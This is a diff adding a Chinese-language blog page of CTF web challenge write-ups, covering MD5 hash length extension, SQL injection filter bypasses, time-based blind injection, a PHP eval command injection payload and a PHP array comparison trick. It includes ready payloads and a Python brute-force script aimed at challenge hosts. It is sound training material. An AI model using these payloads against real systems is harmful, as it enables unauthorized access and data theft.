@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>ctfwp之web | welcome to here</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="做题做题(持续更新)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfwp之web">
+<meta property="og:url" content="http://yoursite.com/2017/11/22/ctfwp之web/index.html">
+<meta property="og:site_name" content="welcome to here">
+<meta property="og:description" content="做题做题(持续更新)">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0069oIoUgy1flvjbqflmmj30kc06d0tz.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/0069oIoUgy1flvje84yv2j30d706174d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0069oIoUgy1flnr2rkr8zj307x04ta9z.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1flniosikksj30fs0cu3yt.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/11/22/ctfwp之web/img/俄罗斯方块.png">
+<meta property="og:updated_time" content="2018-01-07T07:09:58.206Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ctfwp之web">
+<meta name="twitter:description" content="做题做题(持续更新)">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/0069oIoUgy1flvjbqflmmj30kc06d0tz.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="welcome to here" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">welcome to here</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ctfwp之web" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/11/22/ctfwp之web/" class="article-date">
+  <time datetime="2017-11-22T03:22:12.000Z" itemprop="datePublished">2017-11-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ctfwp之web
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>做题做题(持续更新)<br><a id="more"></a></p>
+<h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p>  打开网页后是一个登陆页面查看源码后发现并没有什么东西。那就直接上bp吧！发现cookie里有好多东西。值得注意的是sample-hash=571580b26c65f306376d4f64e53cb5c7，联想到有关hash长度扩展攻击。还有source参数<br>  将source参数修改为一后，页面返回源码。<br>  if (urldecode($username) === “admin” &amp;&amp; urldecode($password) != “admin”) {<br>        if ($COOKIE[“getmein”] === md5($secret . urldecode($username . $password))) {<br>            echo “Congratulations! You are a registered user.\n”;<br>            die (“The flag is “. $flag);<br>可以知道username为admin，而password不能为admin，还要设置cookie的一个参数getmein，且这个参数的MD5值要与secret+username+password的值相等，secret是一个15位长度的 密文。<br>在源码中可以看到setcookie(“sample-hash”, md5($secret . urldecode(“admin” . “admin”)), time() + (60 <em> 60 </em> 24 * 7));则可以知道sample-hash是由secret+adminadmin的MD5加密后得到的<br>之前设置的password不能等于admin就是个坑啊！那还能怎么办嗯？利用hash长度扩展攻击来绕过这个限定，构造出getmein。</p>
+<p>原理：<br>1.hash加密的时候会将字符和数字转换成16进制，并填充到215bit<br>2.MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算<br>3.我们关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，<br>最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。<br>4.MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量IV，这一点很关键！！！<br>5.MD5的最后8位是加密内容的长度<br><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">hash长度扩展攻击资料</a>.了解一下原理。<br>知道了解了以上的原理和内容那就根据题目来构造绕过这个hash加密。现在只知道secret的长度为15并且不知道他的内容，而且知道sample-hash是由secret和adminadmin经过MD5后得到的<br>结果。那么就根据hash扩展的原理进行做。原始明文16进制下填充xxxxxxxxxxxxxxxadminadmin\x80（填满48位，偷个懒不写了）\xc8\x00\x00\x00\x00\x00\x00\x00,那就加入所要加入的信息（这个随便）<br>我加入的是kobe，那么就构造出username为admin，password为admin\x80（填满48位，偷个懒不写了）\xc8\x00\x00\x00\x00\x00\x00\x00kobe。因为是urldecode过的，所以要将16进制的password反urldecode一下就是<br>将\x换成%。知道了username和password后那么就要构造重头戏getmein的hash值。这个可以通过hashpump工具或者自己写个脚本。<br>安装hashpump步骤<br>git clone <a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a><br>apt-get install g++ libssl-dev（gcc编译的需要下载这个工具）<br>cd HashPump<br>make<br>make install<br><img src="http://ww1.sinaimg.cn/large/0069oIoUgy1flvjbqflmmj30kc06d0tz.jpg" alt="使用截图"><br>然后将得到的hash值和username和password输入得到flag<br><img src="http://ww2.sinaimg.cn/large/0069oIoUgy1flvje84yv2j30d706174d.jpg" alt="结果"><br>葛大佬<a href="https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">链接</a></p>
+<h2 id="简单的sql注入2"><a href="#简单的sql注入2" class="headerlink" title="简单的sql注入2"></a>简单的sql注入2</h2><p>  进来开始输入’,发现会报错说明’没有被过滤。然后进过测试发现空格会被过滤。那就寻找空格的替代品，有以下几个%20，%0a，/<strong>/，/<em>!</em>/，/<em>!50000</em>/，+，()。+,()都被过滤了<br>  /</strong>/没有被过滤。那就来找flag，构造’/<strong>/union/select/</strong>/select/<strong>/flag/</strong>/from/<strong>/flag#(因为select被过滤掉了，所以可以采用/</strong>/来间隔消除过滤)</p>
+<h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you"></a><a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">who are you</a></h2><p>  打开页面后发现提示your ip is:112.10.20.111一下就想到了ip伪造x-forwarded-for打开burp就开干。<img src="http://ww1.sinaimg.cn/large/0069oIoUgy1flnr2rkr8zj307x04ta9z.jpg" alt="图片"><br>  并没有什么变化，这个时候陷入僵局。在考虑是不是通过伪造ip来进行过滤，输入’返回’ ，然后输入其他来进行判断发现返回就是输入的值那就判断是基于时间的盲注，用sleep()<br>  来作，通过构造’ or sleep(3) and ‘1’=’1 有延迟注入成功。<br>  在猜测到有表名和列名为flag，’ or sleep(3) and (select flag from flag)=’1.得到表名和列名后开始写脚本来跑 构造的sql语句为’ or sleep(3) and (select substring(flag from i for 1) from flag)=’’为x—forwarded-for<br>  的header</p>
+<h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a><a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">因缺思汀的绕过</a></h2><p>两个提交框点击查看源码一个是uname，另一个是pwd。然后发现有一个source.txt源码文件打开后读源码. 找到关键的代码<img src="http://ww4.sinaimg.cn/large/0069oIoUgy1flniosikksj30fs0cu3yt.jpg" alt="代码图片"><br>发现好多东西都被过滤掉了，但是or group by ，rollup等还没有被过滤掉。嘿嘿可以用用。然后根据源码来一步步注入：从$sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[‘uname’]<br>}’和mysql_num_rows($query) == 1知道返回的行数必须为一。所以可以来构造uname这个参数为：’ or 1 limit 1#来绕过，然后在下面的代码中$key = mysql_fetch_array($query);if($key[‘pwd’] == $_POST[‘pwd’])<br>中要使得返回的pwd和post的pwd相等那么就需要用到rollup，可以将某列中的一个或所有行都变成null。那么就可以根据以上的信息来注入了。’ or 1 group by pwd with rollup limit 1 offset 2#.将第二行设为null（第一行是字段名）</p>
+<h2 id="有点意思吧2"><a href="#有点意思吧2" class="headerlink" title="有点意思吧2"></a>有点意思吧2</h2><p>   打开网页后，常规步骤右键查看源码发现并没有什么东西，然后直接上工具开始扫描网站目录。发现有一个index.php~的页面进入后<br>发现有一个压缩包下载解压后是源码。<a href="https://github.com/Err0rzz/SourceLeakHacker" title="工具链接" target="_blank" rel="noopener">工具链接</a><br>&lt;!DOCTYPE html&gt;</p>
+<p><html></html></p>
+<p><head></head></p>
+<p><title>Web 350</title></p>
+<p><style type="text/css"><br>        body {<br>                background:gray;<br>                text-align:center;<br>        }<br></style><br></p>
+<p><body><br>        &lt;?php<br>                $auth = false;<br>                $role = “guest”;<br>                $salt =<br>                if (isset($_COOKIE[“role”])) {<br>                        $role = unserialize($_COOKIE[“role”]);<br>                        $hsh = $_COOKIE[“hsh”];<br>                        if ($role===”admin” &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[“role”]))) {<br>                                $auth = true;<br>                        } else {<br>                                $auth = false;<br>                        }<br>                } else {<br>                        $s = serialize($role);<br>                        setcookie(‘role’,$s);<br>                        $hsh = md5($salt.strrev($s));<br>                        setcookie(‘hsh’,$hsh);<br>                }<br>                if ($auth) {<br>                        echo “<h3>Welcome Admin. Your flag is“<br>                } else {<br>                        echo “<h3>Only Admin can see the flag!!</h3>“;<br>                }<br>        ?&gt;<br></h3></body><br><br>有源码分析可以知道要想得到flag就必须要构造出一个role=admin，hsh=md5($salt.strrev($_COOKIE[“role”]。因为role是_COOKIE[“role”]<br>发序列化得到的要使得=admin则可以在开头构造s:5:”admin”;来绕过。然后就是要来绕过hsh的值，已经知道_COOKIE[hsh]=3a4727d57463f122833d9e732f94e4e0<br>那么可以根据hash的长度攻击来进行构造。<a href="https://www.cnblogs.com/pcat/p/5478509.html" title="长度攻击资料" target="_blank" rel="noopener">长度攻击资料</a><br>由sttrev函数可以知道要将内容反转，_COOKIE[rolr]=s:5:”guest”;反转后为;”tseug”:5:s,由于不知道salt的长度所以需要用脚本来进行<br>暴力剖解。<br> encoding=utf-8<br>   md5($salt.” ;”tseug”:5:s “) = 3a4727d57463f122833d9e732f94e4e0<br>   md5($salt.” ;”tseug”:5:s xxxxx ;”nimda”:5:s “) = xxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>import requests<br>import hashpumpy<br>import urllib</p>
+<p>hexdigest = “3a4727d57463f122833d9e732f94e4e0”<br>original_data = “;\”tseug\”:5:s”<br>data_to_add = “;\”nimda\”:5:s”<br>url = “<a href="http://web.jarvisoj.com:32778&quot;" target="_blank" rel="noopener">http://web.jarvisoj.com:32778&quot;</a><br> 设置key_length的范围<br>for key_length in xrange(1, 15):<br>    result = hashpumpy.hashpump(hexdigest, original_data, data_to_add, key_length);<br>    role_re = result[1][::-1];  # 16进制\x80 代表一个字符 可以直接对换<br>    role = urllib.quote(role_re)  # 16进制直接url编码得到 %xx<br>    hsh = result[0];<br>    cookies = {‘role’: role, ‘hsh’: hsh}<br>    response = requests.get(url, cookies=cookies)<br>    if response.headers[‘Content-Length’] != ‘210’:<br>        print key_length<br>        print response.text<br>        break;<br>    else:<br>        print key_length<br> 得flag。</p>
+<h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><p>解题思路，需要加上关键截图，最后要看到解出的flag。Xxxxx<br>&lt;?php </p>
+<p>include “flag.php”;<br>error_reporting(0);<br>show_source(<strong>FILE</strong>);</p>
+<p>$a = @$_REQUEST[‘hello’];<br>eval(“var_dump($a);”);<br>有request相应变量为hello，var_dump($a)来注入hello=);<code>echo cat ./flag.php</code>;// 反引号在linux中具有命令替换的功能，<br>分析以上的flag.php文件来进行注入.eval(“var_dump($a)”)双引号不忽略`使得命令可以执行。注入后得flag</p>
+<h2 id="WEB-1（WEB签到）"><a href="#WEB-1（WEB签到）" class="headerlink" title="WEB-1（WEB签到）"></a>WEB-1（WEB签到）</h2><p>&lt;?php<br>highlight_file(‘flag.php’);<br>$_GET[‘id’] = urldecode($_GET[‘id’]);<br>$flag = ‘bdctf{xxxxxxxxxxxxxxxxxx}’;<br>if (isset($_GET[‘user’]) and isset($_POST[‘pass’])) {<br>    if ($_GET[‘user’] == $_POST[‘pass’]) </p>
+<pre><code>    print &apos;pass can not be user.&apos;; 
+
+else if (sha1($_GET[&apos;user&apos;]) === sha1($_POST[&apos;pass&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) 
+
+    die(&apos;Flag: &apos;.$flag); 
+
+else 
+
+    print &apos;sorry!&apos;; 
+</code></pre><p>}<br>?&gt;<br>由以上代码可以看出是需要有 一个get id=margin 以及sha1($_GET[‘user’]) === sha1($_POST[‘pass’]又由php无法处理数组可以作<br>如下处理user[]=1 post 中pass[]=2就可以成功绕过</p>
+<h2 id="俄罗斯方块"><a href="#俄罗斯方块" class="headerlink" title="俄罗斯方块"></a>俄罗斯方块</h2><p>   打开题目链接是一个玩俄罗斯方块游戏的界面，然后查看网页源代码发现里面有一个tetris.js源文件，打开后<br>看到javascript源代码，将代码<a href="http://tool.oschina.net/codeformat/js/" title="格式化" target="_blank" rel="noopener">格式化</a>可以看到有一个<br>关键的函数：<br>this.mayAdd = function(a) {<br>            if (this.scores.length &lt; this.maxscores) return 1E6 &lt; a &amp;&amp; (a = new p, a.set(“urlkey”, “webqwer” [1] + “100.js”, 864E5)),<br>            !0;<br>            for (var b = this.scores.length - 1; 0 &lt;= b; –b) if (this.scores[b].score &lt; a) return 1E6 &lt; a &amp;&amp; (a = new p, a.set(“urlkey”, “webqwer” [1] + “100.js”, 864E5)),<br>            !0;<br>            return ! 1<br>        };<br>然后查看this.set有五个参数而在上述却只有3个参数不太呀！想不通了。。。。。。<br>查看大佬wp后得知urlkey-&gt;url+e100.js打开后是jsfuck编码<img src="img/俄罗斯方块.png" alt="截图"> 然后解码<a href="http://www.bugku.com/tools/jsfuck/#" title="解码" target="_blank" rel="noopener">解码</a></p>
+<h2 id="对方不想和你说话，并向你扔来了世界上最好的语言"><a href="#对方不想和你说话，并向你扔来了世界上最好的语言" class="headerlink" title="对方不想和你说话，并向你扔来了世界上最好的语言"></a>对方不想和你说话，并向你扔来了世界上最好的语言</h2><p> &lt;?php<br>show_source(<strong>FILE</strong>);//高亮<br>$v1=0;$v2=0;$v3=0;//定义三个变量，分别v1 v2 v3<br>$a=(array)json_decode(@$_GET[‘foo’]);//get的方式得到foo参数的值<br>if(is_array($a)){<br>    is_numeric(@$a[“bar1”])?die(“nope”):NULL;<br>    if(@$a[“bar1”]){<br>        ($a[“bar1”]&gt;2016)?$v1=1:NULL;<br>    }//要求foo值里面要有一个键名是bar1的键值与2016比较且大于2016</p>
+<pre><code>if(is_array(@$a[&quot;bar2&quot;])){
+    if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;);
+    $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);
+    $pos===false?die(&quot;nope&quot;):NULL;
+    foreach($a[&quot;bar2&quot;] as $key=&gt;$val){
+        $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;
+    }//要求foo值里面有个键名为bar2且其键值为一个长度等于5的数组且第一个值也为数组，还要有一个键名为a2键值为nudt
+    $v2=1;
+}
+</code></pre><p>}<br>$c=@$_GET[‘cat’];<br>$d=@$_GET[‘dog’];<br>if(@$c[1]){<br>    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){<br>        eregi(“3|1|c”,$d.$c[0])?die(“nope”):NULL;<br>        strpos(($c[0].$d), “htctf2016”)?$v3=1:NULL;<br>    }<br>}//要求cat参数的cat[0]=htctf2016由于eregi需要截断所以要用%00截断，所以cat[1]=%00htctf2016，cat[1]与dog相比不相等就行<br>if($v1 &amp;&amp; $v2 &amp;&amp; $v3){<br>    include “flag.php”;<br>    echo $flag;<br>}<br>?&gt;</p>
+<p>因此参数为foo={“bar1”:”2017a”,”bar2”:[[1],1,2,3,0],”a2”:[“nudt”,1,2,3,0]}&amp;cat[0]=%00htctf2016&amp;cat[1][]=1111&amp;d=1</p>
+<p>故可以拼凑url为<a href="http://218.76.35.75:20114/index.php?foo={&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[1],1,2,3,0],&quot;a2&quot;:[&quot;nudt&quot;,1,2,3,0]}&amp;cat[0]=%00htctf2016&amp;cat[1][]=1111&amp;d=1" target="_blank" rel="noopener">http://218.76.35.75:20114/index.php?foo={&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[1],1,2,3,0],&quot;a2&quot;:[&quot;nudt&quot;,1,2,3,0]}&amp;cat[0]=%00htctf2016&amp;cat[1][]=1111&amp;d=1</a></p>
+<p>即可得到flag</p>
+<h2 id="水能载舟亦可赛艇"><a href="#水能载舟亦可赛艇" class="headerlink" title="水能载舟亦可赛艇"></a>水能载舟亦可赛艇</h2><p>首先查看源码发现有一个source.txt源码文件打开后读源码<br>可以看到，这里面有SQL的一个过滤器，把一些sql的关键字例如benchmark，join等都过滤了<br>而且sql查询语句是：<br>[php] view plain copy  在CODE上查看代码片派生到我的代码片<br><span style="font-size:18px;">SELECT * FROM interest WHERE uname = ‘{$_POST[‘uname’]}<br></span><br>又由：<br>[php] view plain copy  在CODE上查看代码片派生到我的代码片<br><span style="font-size:18px;">mysql_num_rows($query) == 1</span><br>这个判断可以得知数据库中的记录就只有一条，这部分逻辑大概就是然后通过提交的uname查询出结果，如果结果只有一条则继续，如果查询结果中的pwd字段和post过去的key值相同，则给出flag。<br>这时就要用到注入的一个小技巧，我们使用group by pwd with rollup 来在查询结果后加一行，并且这一行pwd字段的值为NULL<br>在mysql官方文档中是这样描述rollup函数的：</p>
+<p>大概的意思就是在GROUP BY子句中使用WITH ROLLUP会在数据库中加入一行用来计算总数，ROLLUP子句的更加详细的用法，可以参考mysql的官方文档，此处就不多做赘述了。<br>再结合limit和offset就可以写出一个payload<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup  （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2  （从第二行开始查询）</p>
+<p>#注释<br>此时密码只要为空即可查询成功</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/11/22/ctfwp之web/" data-id="cjep9mro70000zco0gufu1pmh" class="article-share-link">Teilen</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/11/22/vps翻墙简单教程/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          vps翻墙简单教程
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/11/16/wifi干扰攻击/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">wifi干扰攻击</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/12/csrf学习/">web学习</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/10/sql注入的预防/">sql注入的预防</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/06/渗透测试流程-1/">渗透测试流程</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/19/xss简介/">xss学习</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/08/上传漏洞fckeditor的利用/">上传漏洞fckeditor的利用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 BlackManba<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
